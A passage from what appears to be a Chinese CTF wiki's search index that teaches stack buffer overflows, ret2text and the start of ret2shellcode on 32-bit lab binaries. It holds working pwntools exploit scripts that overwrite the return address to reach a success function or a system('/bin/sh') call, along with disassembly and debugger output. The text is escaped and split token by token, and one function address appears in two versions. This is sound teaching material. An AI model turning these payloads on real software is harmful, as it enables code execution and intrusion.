\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002 \u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884csuccess\u51fd\u6570\u3002  \u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u9f50\u8fdb\u884c\u7f16\u8bd1  \u279c  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example\nstack_example.c: In  function  \u2018vulnerable\u2019:\nstack_example.c:6:3: warning: implicit declaration of  function  \u2018gets\u2019  [ -Wimplicit-function-declaration ] \n   gets ( s ) ; \n   ^\n/tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a\nstack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the  ` gets   function  is dangerous and should not be used.  \u53ef\u4ee5\u770b\u51fagets\u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u800c\u5b83\u56e0\u4e3a\u5176\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u662f\u5426\u8f93\u5165\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c   \u5386\u53f2\u4e0a\uff0c \u83ab\u91cc\u65af\u8815\u866b \u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86gets\u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002   \u6b64\u5916\uff0c -m32  \u6307\u7684\u662f\u751f\u621032\u4f4d\u7a0b\u5e8f\uff1b  -fno-stack-protector  \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210canary\u3002\u6b64\u5916\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fASLR\u4fdd\u62a4\u3002\u8fd9\u662f\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u5229\u7528IDA\u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770bvulnerable\u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230  int   vulnerable ()  { \n   char   s ;   // [sp+4h] [bp-14h]@1 \n\n   gets ( s ); \n   return   puts ( s );  }   \u8be5\u5b57\u7b26\u4e32\u8ddd\u79bbebp\u7684\u957f\u5ea6\u4e3a0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a                                             +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp--- +-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-- +-----------------+  \u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDA\u83b7\u5f97success\u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a0x0804846B\u3002  .text: 0804843 B   success           proc   near  .text: 0804843 B                   push      ebp  .text: 0804843 C                   mov       ebp ,   esp  .text: 0804843 E                   sub       esp ,   8  .text: 08048441                   sub       esp ,   0 Ch  .text: 08048444                   push      offset   s          ;  You Hava already controlled it.  .text : 08048449                   call      _puts  .text: 0804844 E                   add       esp ,   10 h  .text: 08048451                   nop  .text: 08048452                   leave  .text: 08048453                   retn  .text: 08048453   success           endp   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a  0x14* a + bbbb +success_addr  \u90a3\u4e48\uff0c\u7531\u4e8egets\u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06saved ebp\u8986\u76d6\u4e3abbbb\uff0c\u5c06retaddr\u8986\u76d6\u4e3asuccess_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a                                             +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp--- +-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-- +-----------------+  \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u5bf9\u5e94\u7684\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B\u7684\u5b58\u50a8\u662f\u5982\u4e0b\u7ed3\u6784  \\x3b\\x84\\x04\\x08  \u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06\\x3b\u4e4b\u7c7b\u7684\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2pwntools\u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884cgithub)\uff0c\u8fd9\u91cc\u5229\u7528pwntools\u7684\u4ee3\u7801\u5982\u4e0b\uff1a  ##coding=utf8  from   pwn   import   *  ## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61  sh   =   process ( ./stack_example )  success_addr   =   0x0804843b  ## \u6784\u9020payload  payload   =   a   *   0x14   +   bbbb   +   p32 ( success_addr )  print   p32 ( success_addr )  ## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32  sh . sendline ( payload )  ## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92  sh . interactive ()   \u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230  \u279c  stack-example python exp.py [ + ]  Starting  local  process  ./stack_example : pid  61936  ; \\x 84 \\x 0  [ * ]  Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb ; \\x 84 \\x 0 \nYou Hava already controlled it. [ * ]  Got EOF  while  reading in interactive\n$  [ * ]  Process  ./stack_example  stopped with  exit  code -11  ( SIGSEGV )   ( pid  61936 )  [ * ]  Got EOF  while  sending in interactive  \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884csuccess\u51fd\u6570\u3002", 
            "title": "\u57fa\u672c\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_4", 
            "text": "\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_5", 
            "text": "\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002  \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b   \u8f93\u5165  gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00'  scanf  vscanf    \u8f93\u51fa  sprintf    \u5b57\u7b26\u4e32  strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62  strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62  bcopy", 
            "title": "\u5bfb\u627e\u5371\u9669\u51fd\u6570"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_6", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb \u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f   \u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15  \u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15  \u76f4\u63a5\u5730\u5740\u7d22\u5f15   \u5176\u4e2d\u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97\uff1b\u76f8\u5bf9\u4e8e\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u95ee\u9898\u3002\u901a\u8fc7\u7edd\u5bf9\u5730\u5740\u7d22\u5f15\u7684\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42   \u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740 \uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770bEBP\u5373\u53ef\u3002  \u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002  \u8986\u76d6bss\u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \u3002  \u7b49\u7b49   \u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002  \u53c2\u8003\u9605\u8bfb  stack buffer overflow  http://bobao.360.cn/learning/detail/3694.html", 
            "title": "\u786e\u5b9a\u586b\u5145\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/", 
            "text": "\u57fa\u672cROP\n\n\n\u968f\u7740NX\u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662fROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728\n\u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a(\u8fd9\u4e00\u6761\u4e4b\u540e\u4e0d\u518d\u91cd\u590d\u63d0\u53ca)\uff0c\u901a\u8fc7\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5(gadgets)\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\u6240\u8c13gadgets\u5c31\u662f\u4ee5ret\u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3aROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684ret\u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP\u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\n\n\n\n\n\u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002\n\n\n\u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684gadgets\u4ee5\u53ca\u76f8\u5e94gadgets\u7684\u5730\u5740\u3002\u5982\u679c\u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u60f3\u529e\u6cd5\u6cc4\u9732gadgets\u7684\u5730\u5740\u4e86\u3002\n\n\n\n\nret2text\n\n\n\u539f\u7406\n\n\nret2text\u5373\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662fgadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684rop\u3002\n\n\n\u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002\n\n\n\u4f8b\u5b50\n\n\n\u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox\u4e2d\u4ecb\u7ecdROP\u65f6\u4f7f\u7528\u7684ret2text\u7684\u4f8b\u5b50\u3002\n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2text\n\n\n\u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236\n\n\n\u279c  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f32\u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528IDA\u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\n_bss_start\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nThere is something amazing here, do you know anything?\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nprintf\n(\nMaybe I will tell you next time !\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86gets\u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0\n\n\n.text:\n080485\nFD\n \nsecure\n          \nproc\n \nnear\n\n\n.text:\n080485\nFD\n\n\n.text:\n080485\nFD\n \ninput\n           \n=\n \ndword\n \nptr\n \n-\n10\nh\n\n\n.text:\n080485\nFD\n \nsecretcode\n      \n=\n \ndword\n \nptr\n \n-\n0\nCh\n\n\n.text:\n080485\nFD\n\n\n.text:\n080485\nFD\n                 \npush\n    \nebp\n\n\n.text:\n080485\nFE\n                 \nmov\n     \nebp\n,\n \nesp\n\n\n.text:\n08048600\n                 \nsub\n     \nesp\n,\n \n28\nh\n\n\n.text:\n08048603\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \n0\n \n; timer\n\n\n.text\n:\n0804860\nA\n                 \ncall\n    \n_time\n\n\n.text:\n0804860\nF\n                 \nmov\n     \n[\nesp\n],\n \neax\n      \n; seed\n\n\n.text\n:\n08048612\n                 \ncall\n    \n_srand\n\n\n.text:\n08048617\n                 \ncall\n    \n_rand\n\n\n.text:\n0804861\nC\n                 \nmov\n     \n[\nebp\n+\nsecretcode\n],\n \neax\n\n\n.text:\n0804861\nF\n                 \nlea\n     \neax\n,\n \n[\nebp\n+\ninput\n]\n\n\n.text:\n08048622\n                 \nmov\n     \n[\nesp\n+\n4\n],\n \neax\n\n\n.text:\n08048626\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \noffset\n \nunk_8048760\n\n\n.text:\n0804862\nD\n                 \ncall\n    \n___isoc99_scanf\n\n\n.text:\n08048632\n                 \nmov\n     \neax\n,\n \n[\nebp\n+\ninput\n]\n\n\n.text:\n08048635\n                 \ncmp\n     \neax\n,\n \n[\nebp\n+\nsecretcode\n]\n\n\n.text:\n08048638\n                 \njnz\n     \nshort\n \nlocret_8048646\n\n\n.text:\n0804863\nA\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \noffset\n \ncommand\n \n; \n/bin/sh\n\n\n.text\n:\n08048641\n                 \ncall\n    \n_system\n\n\n\n\n\n\u5728secure\u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528system(\"/bin/sh\")\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f30x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684shell\u4e86\u3002\n\n\n\u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020payload\u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u5730\u5740\u8ddd\u79bbmain\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002\n\n\n.text:\n080486\nA7\n                 \nlea\n     \neax\n,\n \n[\nesp\n+\n1\nCh\n]\n\n\n.text:\n080486\nAB\n                 \nmov\n     \n[\nesp\n],\n \neax\n      \n; s\n\n\n.text\n:\n080486\nAE\n                 \ncall\n    \n_gets\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u67e5\u770besp\uff0cebp\uff0c\u5982\u4e0b\n\n\ngef\u27a4  b *0x080486AE\nBreakpoint \n1\n at 0x80486ae: file ret2text.c, line \n24\n.\ngef\u27a4  r\nThere is something amazing here, \ndo\n you know anything?\n\nBreakpoint \n1\n, 0x080486ae in main \n()\n at ret2text.c:24\n\n24\n      gets\n(\nbuf\n)\n;\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n registers \n]\n\u2500\u2500\u2500\u2500\n\n$eax\n   : 0xffffcd5c  \u2192  0x08048329  \u2192  \n__libc_start_main\n\n\n$ebx\n   : 0x00000000\n\n$ecx\n   : 0xffffffff\n\n$edx\n   : 0xf7faf870  \u2192  0x00000000\n\n$esp\n   : 0xffffcd40  \u2192  0xffffcd5c  \u2192  0x08048329  \u2192  \n__libc_start_main\n\n\n$ebp\n   : 0xffffcdc8  \u2192  0x00000000\n\n$esi\n   : 0xf7fae000  \u2192  0x001b1db0\n\n$edi\n   : 0xf7fae000  \u2192  0x001b1db0\n\n$eip\n   : 0x080486ae  \u2192  \nmain+102\n call 0x8048460 \ngets@plt\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230esp\u4e3a0xffffcd40\uff0cebp\u4e3a\u5177\u4f53\u7684payload\u5982\u4e0b0xffffcdc8\uff0c\u540c\u65f6s\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\u4e3a[esp+0x1c]\uff0c\u6240\u4ee5\uff0cs\u7684\u5730\u5740\u4e3a0xffffcd5c\uff0c\u6240\u4ee5s\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a0x6c+4\u3002\n\n\n\u6700\u540e\u7684payload\u5982\u4e0b\uff1a\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nsh\n \n=\n \nprocess\n(\n./ret2text\n)\n\n\ntarget\n \n=\n \n0x804863a\n\n\nsh\n.\nsendline\n(\nA\n \n*\n \n(\n0x6c\n+\n4\n)\n \n+\n \np32\n(\ntarget\n))\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\nret2shellcode\n\n\n\u539f\u7406\n\n\nret2shellcode\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\u4ee3\u7801\u3002\u800c\u6240\u8c13\u7684shellcode\u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684shell\u3002\n\u4e00\u822c\u6765\u8bf4\uff0cshellcode\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u7684\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801\n\u3002\n\n\n\u800c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u4e00\u822c\u90fd\u662f\u5411\u6808\u4e2d\u5199\u5185\u5bb9\uff0c\u6240\u4ee5\u8981\u60f3\u6267\u884cshellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2shellcode\u4e3a\u4f8b  \n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2shellcode\n\n\n\u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4\n\n\n\u279c  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n    RWX:      Has RWX segments\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528IDA\u770b\u4e00\u4e0b\u7a0b\u5e8f\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\nstdin\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nNo system for you this time !!!\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nstrncpy\n(\nbuf2\n,\n \n(\nconst\n \nchar\n \n*\n)\nv4\n,\n \n0x64u\n);\n\n  \nprintf\n(\nbye bye ~\n);\n\n  \nreturn\n 